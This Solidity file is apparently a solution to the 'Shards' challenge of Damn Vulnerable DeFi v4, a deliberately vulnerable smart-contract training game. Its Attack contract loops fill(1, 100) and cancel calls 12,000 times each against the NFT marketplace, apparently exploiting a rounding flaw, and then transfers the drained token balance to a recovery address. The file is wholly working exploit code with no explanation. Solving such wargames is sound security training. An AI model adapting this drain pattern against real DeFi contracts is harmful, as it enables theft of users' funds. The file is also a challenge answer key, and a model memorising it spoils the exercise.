// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {ShardsNFTMarketplace} from "./ShardsNFTMarketplace.sol";


contract Attack {
    ShardsNFTMarketplace public immutable marketplace;
    address public immutable recovery;
    DamnValuableToken public immutable token;


    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery){
        marketplace = _marketplace;
        recovery = _recovery;
        token = _token;
    }

    function attack() public {
        for(uint i = 0; i < 12000; i++){marketplace.fill(1, 100);}
        for (uint i = 0; i < 12000; i++) { marketplace.cancel(1,i);}

        token.transfer(recovery, token.balanceOf(address(this)));
    } 
}